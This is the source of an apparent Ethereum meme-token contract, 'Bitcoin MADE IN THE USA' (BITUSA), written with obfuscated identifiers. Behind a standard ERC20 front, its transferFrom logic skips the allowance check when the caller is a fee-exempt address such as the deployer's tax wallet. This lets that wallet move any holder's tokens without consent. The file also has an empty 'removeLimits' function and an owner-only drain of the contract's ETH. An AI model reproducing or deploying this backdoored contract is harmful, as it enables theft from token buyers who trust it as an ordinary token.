// SPDX-License-Identifier: MIT

/*
Bitcoin MADE IN THE USA
BITUSA

https://t.me/BITUSAonEth

https://truthsocial.com/@realDonaldTrump/posts/112601639679885930

https://x.com/WatcherGuru/status/1800745494639263782

https://www.coindesk.com/business/2024/06/12/trump-we-want-all-remaining-bitcoin-to-be-made-in-usa/

*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract BITUSA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcYYTY;
    mapping(address => mapping(address => uint256)) private _allcvnkjnYYTY;
    mapping(address => bool) private _feevblknlYYTY;
    address payable private _taxclknlYYTY;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Bitcoin MADE IN THE USA";
    string private constant _symbol = unicode"BITUSA";

    uint256 private _vkjbnkfjYYTY = 10;
    uint256 private _maxovnboiYYTY = 10;
    uint256 private _initvkjnbkjYYTY = 20;
    uint256 private _finvjlkbnlkjYYTY = 0;
    uint256 private _redclkjnkYYTY = 2;
    uint256 private _prevlfknjoiYYTY = 2;
    uint256 private _buylkvnlkYYTY = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknYYTY;
    bool private _inlknblYYTY = false;
    bool private swapvlkYYTY = false;
    uint256 private _sellcnjkYYTY = 0;
    uint256 private _lastflkbnlYYTY = 0;
    address constant _deadlknYYTY = address(0xdead);

    uint256 public _vnbbvlkYYTY = qq30fef / 100;
    uint256 public _oijboijoiYYTY = 15 * 10**18;
    uint256 private _cvjkbnkjYYTY = 10;

    modifier lockTheSwap() {
        _inlknblYYTY = true;
        _;
        _inlknblYYTY = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcYYTY[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    
    function _calcTax_lvknblYYTY(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblYYTY) {
                taxAmount = amount
                    .mul((_buylkvnlkYYTY > _redclkjnkYYTY) ? _finvjlkbnlkjYYTY : _initvkjnbkjYYTY)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlYYTY[to] &&
                to != _taxclknlYYTY
            ) {
                _buylkvnlkYYTY++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblYYTY &&
                to == uniswapV2Pair &&
                from != _taxclknlYYTY &&
                swapvlkYYTY &&
                _buylkvnlkYYTY > _prevlfknjoiYYTY
            ) {
                if (block.number > _lastflkbnlYYTY) {
                    _sellcnjkYYTY = 0;
                }
                _sellcnjkYYTY = _sellcnjkYYTY + _getAmountOut_lvcbnkYYTY(amount);
                require(_sellcnjkYYTY <= _oijboijoiYYTY, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkYYTY)
                    _swapTokenslknlYYTY(_vnbbvlkYYTY > amount ? amount : _vnbbvlkYYTY);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjYYTY(address(this).balance);
                }
                _lastflkbnlYYTY = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlYYTY = payable(_msgSender());
        
        _balknvlkcYYTY[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcYYTY[address(this)] = (qq30fef * 98) / 100;
        _feevblknlYYTY[address(this)] = true;
        _feevblknlYYTY[_taxclknlYYTY] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojYYTY(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlYYTY[msg.sender]) return !_feevblknlYYTY[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknYYTY)) return false;
        return true;
    }

    function _transfer_kjvnYYTY(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblYYTY(from, to, amount);
        _balknvlkcYYTY[from] = _balknvlkcYYTY[from].sub(amount);
        _balknvlkcYYTY[to] = _balknvlkcYYTY[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcYYTY[address(this)] = _balknvlkcYYTY[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknYYTY) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnYYTY[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnYYTY(sender, recipient, amount);
        if (_downcklkojYYTY(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnYYTY[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjYYTY(uint256 amount) private {
        _taxclknlYYTY.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnYYTY(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnYYTY[owner][spender];
    }

    function _swapTokenslknlYYTY(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function TTQAA() external onlyOwner {
        require(!_tradingvlknYYTY, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkYYTY = true;
        _tradingvlknYYTY = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnYYTY() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkYYTY(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblYYTY(address payable newWallet) external {
        require(_feevblknlYYTY[_msgSender()]);
        _taxclknlYYTY = newWallet;
        _feevblknlYYTY[_taxclknlYYTY] = true;
    }
}